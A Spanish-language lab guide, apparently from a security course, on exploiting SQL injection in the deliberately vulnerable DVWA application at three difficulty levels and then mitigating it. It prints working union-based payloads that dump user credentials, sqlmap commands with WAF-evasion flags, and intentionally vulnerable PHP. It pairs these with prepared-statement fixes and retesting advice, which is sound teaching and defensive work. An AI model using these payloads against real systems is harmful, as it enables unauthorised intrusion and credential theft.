# 💉 SQL Injection en DVWA — Guía profesional

> **Nivel:** Intermedio → Avanzado · **Entorno:** DVWA (Damn Vulnerable Web Application)
>
> Objetivo: dominar la inyección SQL **de forma manual** (entender la mecánica) y **automatizada** (SQLMap), y saber **mitigarla** como lo haría un profesional. No es "probar y ver qué pasa": es un método.

---

## Índice

1. [Qué es SQL Injection (la mecánica real)](#1-qué-es-sql-injection-la-mecánica-real)
2. [Tipos de SQLi](#2-tipos-de-sqli)
3. [Metodología manual paso a paso](#3-metodología-manual-paso-a-paso)
4. [Explotación en DVWA (Low / Medium / High)](#4-explotación-en-dvwa-low--medium--high)
5. [Automatización con SQLMap](#5-automatización-con-sqlmap)
6. [Mitigación (Blue / Purple)](#6-mitigación-blue--purple)
7. [Reflexión Red / Blue / Purple](#7-reflexión-red--blue--purple)
8. [Referencias](#8-referencias)

---

## 1. Qué es SQL Injection (la mecánica real)

SQLi ocurre cuando el **input del usuario se concatena directamente en una consulta SQL** sin parametrizar, permitiendo alterar la semántica de la query.

### Código vulnerable (DVWA Low)

```php
$id = $_REQUEST['id'];

$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
```

El valor de `$id` entra **dentro de comillas simples** y **sin escapar**. Si el usuario envía `1`, la query es:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1';
```

### Por qué es explotable

Si el usuario envía `1' OR '1'='1`, la query queda:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

La parte `'1'='1'` es **siempre verdadera**, así que `WHERE` devuelve **todas** las filas. El atacante ha cerrado la cadena de la query con `'` y ha inyectado lógica SQL propia.

> **Mecánica esencial:** el payload debe (1) cerrar el contexto de la query y (2) añadir SQL válido. El resto es orquestar eso para extraer datos.

---

## 2. Tipos de SQLi

| Tipo | Sub-tipo | Cómo se detecta | Cómo se explota |
|---|---|---|---|
| **In-band** (respuesta visible) | Error-based | Errores SQL en pantalla | Extraer datos vía mensajes de error |
| | Union-based | La app muestra resultados de la query | `UNION SELECT` para inyectar columnas propias |
| **Inferential / Blind** (sin respuesta directa) | Boolean-based | La respuesta cambia según true/false | Preguntas de sí/no bit a bit |
| | Time-based | La respuesta tarda según una condición | `SLEEP()` condicional |
| **Out-of-band** | — | Datos exfiltrados por canal lateral | `LOAD_FILE`, DNS, HTTP |

En DVWA veremos sobre todo **Union-based** (Low/High) y **boolean/error** (Medium).

---

## 3. Metodología manual paso a paso

Sigue siempre este orden. Cada paso confirma una hipótesis antes de pasar al siguiente.

### Paso 0 — Confirmar que hay un punto de inyección

Prueba con una **comilla simple** y observa el error:

```
Input: 1'
→ You have an error in your SQL syntax; check the manual...
```

Un error de sintaxis SQL en pantalla = **inyección confirmada** (error-based).

### Paso 1 — Determinar el número de columnas

La query original devuelve 2 columnas (`first_name`, `last_name`). Para `UNION`, necesitas saber cuántas son.

**Método ORDER BY** (incrementa hasta que falle):

```
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -   ← error: "Unknown column '3' in 'order clause'"
```

→ Hay **2 columnas**.

**Método UNION SELECT** (alternativo):

```
1' UNION SELECT 1-- -        ← error (nº de columnas distinto)
1' UNION SELECT 1,2-- -      ← OK → 2 columnas
```

### Paso 2 — Ver qué columnas se reflejan en pantalla

```
1' UNION SELECT 1,2-- -
```

Si la página muestra `First name: 1`, `Surname: 2`, sabes que **ambas columnas son visibles**. Eso es donde inyectarás datos.

### Paso 3 — Extraer información de la base de datos

**Versión y usuario:**

```
1' UNION SELECT version(), user()-- -
1' UNION SELECT @@version, @@datadir-- -
```

**Bases de datos:**

```
1' UNION SELECT 1, schema_name FROM information_schema.schemata-- -
```

**Tablas de una base:**

```
1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()-- -
```

**Columnas de una tabla (ej. `users`):**

```
1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'-- -
```

**Datos sensibles (el objetivo real):**

```
1' UNION SELECT user, password FROM users-- -
```

Resultado típico en DVWA:

```
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99   ← MD5 de "password"
```

---

## 4. Explotación en DVWA (Low / Medium / High)

### 4.1 Nivel Low — Union-based clásico

Contexto: `... WHERE user_id = '$id';` (comillas simples, sin escapar).

```
# Confirmar inyección
1'

# Nº de columnas
1' ORDER BY 3-- -     → error
1' ORDER BY 2-- -     → OK

# Volcar credenciales
1' UNION SELECT user, password FROM users-- -
```

### 4.2 Nivel Medium — Union-based sin comillas (bypass de escaping)

Contexto: el input va por **POST** y pasa por `mysqli_real_escape_string()` (escapa comillas). **Pero** la query sigue concatenando dentro de comillas:

```php
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_POST['id']);
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

El truco: usar payloads **sin comillas simples** y comentar la comilla final con `-- -`.

```
# El parámetro va en el cuerpo POST (Burp: id=...)

# Boolean puro (sin comillas)
1 OR 1=1-- -            → lista todas las filas

# Union-based sin comillas
1 UNION SELECT user, password FROM users-- -

# (si necesitas cadenas, usa HEX: 0x61646d696e en vez de 'admin')
```

### 4.3 Nivel High — Union-based con LIMIT

Contexto: sin comillas alrededor del id y con `LIMIT 1` al final:

```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id LIMIT 1;";
```

El `LIMIT 1` limita el resultado. Se anula comentándolo:

```
1 UNION SELECT user, password FROM users-- -
```

`-- -` comenta el `LIMIT 1`, y el `UNION` devuelve **todas** las filas de `users`.

---

## 5. Automatización con SQLMap

> **Regla:** primero entiende a mano (sección 3-4), **después** automatiza. SQLMap sin criterio te convierte en un "script kiddie".

### 5.1 Dependencias y acceso

DVWA exige **sesión autenticada**. Necesitas el valor de la cookie `PHPSESSID` y el nivel de seguridad (`security=low`).

Cómo obtener la cookie:

- Chrome/Edge DevTools → pestaña **Application → Cookies**, o
- Burp Suite → pestaña **Proxy → HTTP history** → copia el header `Cookie:`.

### 5.2 Enumeración básica

```bash
# Ver si el objetivo es inyectable (usa la cookie de sesión)
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  --batch

# Listar bases de datos
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=TU_SESION; security=low" \
  --batch --dbs
```

| Flag | Qué hace |
|---|---|
| `-u` | URL objetivo (con el parámetro a probar) |
| `--cookie` | Cookie de sesión autenticada |
| `--batch` | Usa respuestas por defecto (no pregunta) |
| `--dbs` | Enumera las bases de datos |
| `-p id` | Fuerza a probar solo el parámetro `id` |
| `--risk 3 --level 5` | Payloads más agresivos (pruébalos solo en labs) |

### 5.3 Extraer datos

```bash
# Tablas de la base actual
sqlmap -u "..." --cookie="..." --batch -D dvwa --tables

# Columnas de la tabla users
sqlmap -u "..." --cookie="..." --batch -D dvwa -T users --columns

# Volcar usuarios y contraseñas
sqlmap -u "..." --cookie="..." --batch -D dvwa -T users -C user,password --dump
```

### 5.4 SQLMap en nivel Medium (POST)

```bash
# -r toma la request completa desde un archivo (Burp: clic derecho → "Copy to file")
sqlmap -r request.txt --batch -D dvwa -T users --dump
```

### 5.5 Flags de control (buenas prácticas)

| Flag | Uso |
|---|---|
| `--dbms=mysql` | Forza el motor (más rápido, menos ruido) |
| `--technique=U` | Solo Union-based (U=Union, B=Boolean, T=Time, E=Error, S=Stacked) |
| `--no-cast` / `--no-escape` | Evita fallos con algunos WAF |
| `--delay=1` / `--random-agent` | Reduce ruido y evasión básica de WAF |
| `--tamper=space2comment` | Bypass simple de WAF (hay decenas en `sqlmap --list-tampers`) |

---

## 6. Mitigación (Blue / Purple)

La defensa correcta es **por capas**, en este orden de prioridad:

### 6.1 Parametrización (la única solución de raíz)

Nunca concatenar input en SQL. Usa **prepared statements**.

**PHP (PDO):**

```php
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = :id");
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();
```

**Python (SQLAlchemy / DB-API):**

```python
cursor.execute("SELECT first_name, last_name FROM users WHERE user_id = %s", (id,))
```

**Java (JDBC PreparedStatement):**

```java
PreparedStatement ps = conn.prepareStatement(
    "SELECT first_name, last_name FROM users WHERE user_id = ?");
ps.setInt(1, id);
```

### 6.2 Validación de entrada

- Si el id es numérico, **forzar tipo entero**: `$id = (int) $_GET['id'];`
- Lista blanca (allowlist) en vez de lista negra.
- **Nunca** confiar solo en `mysqli_real_escape_string()`: no previene inyección sin comillas (caso Medium).

### 6.3 Menor privilegio

- La cuenta SQL de la app **no debe** ser `root`.
- Aplicar `GRANT` mínimo (solo `SELECT/INSERT/UPDATE` sobre tablas necesarias).
- Separar cuentas de lectura/escritura.

### 6.4 WAF y logging

- WAF/proxy (ModSecurity, Cloudflare, AWS WAF) para detectar payloads obvios.
- **Loggear queries erróneas** en el backend: los intentos de SQLi dejan errores de sintaxis → alerta temprana.
- Desactivar `display_errors` en producción (los mensajes de error filtran estructura).

### 6.5 Re-test Purple

Después de corregir, vuelve a lanzar **los mismos payloads** de la sección 4 y SQLMap: el punto debe dejar de responder. Ese re-test es el entregable Purple (ver `portafolio/`).

---

## 7. Reflexión Red / Blue / Purple

- **Red:** ¿Qué datos extrajiste que no deberías ver? ¿Qué impacto tendría en la tríada CIA (confidencialidad/integridad/disponibilidad)?
- **Blue:** ¿Qué controles faltaban? (parametrización, validación, privilegios, logging). ¿Qué alerta habría disparado cada payload?
- **Purple:** ¿Qué test automatizado dejarías para re-ejecutar tras la corrección y garantizar que no hay regresión?

---

## 8. Referencias

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection (vulnerabilidad)](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger Web Security Academy — SQL Injection](https://portswigger.net/web-security/sql-injection)
- [SQLMap Wiki (oficial)](https://github.com/sqlmapproject/sqlmap/wiki)

---

**[← Patrones de hardening web](../teoria/03-patrones-hardening-web.md)** · **[→ XSS](./xss-dvwa-juice-shop.md)**
